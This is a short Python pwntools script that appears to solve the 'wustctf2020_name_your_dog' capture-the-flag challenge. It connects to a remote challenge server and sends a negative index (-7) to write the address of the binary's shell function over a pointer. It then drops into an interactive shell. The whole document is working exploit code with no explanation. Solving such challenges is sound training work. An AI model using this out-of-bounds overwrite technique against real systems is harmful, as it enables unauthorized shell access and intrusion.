from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10250)
elf = ELF('./wustctf2020_name_your_dog')
shell = elf.symbols['shell']
io.sendlineafter(b'Name for which?\n>', b'-7')
io.sendlineafter(b'Give your name plz:', p32(shell))
io.interactive()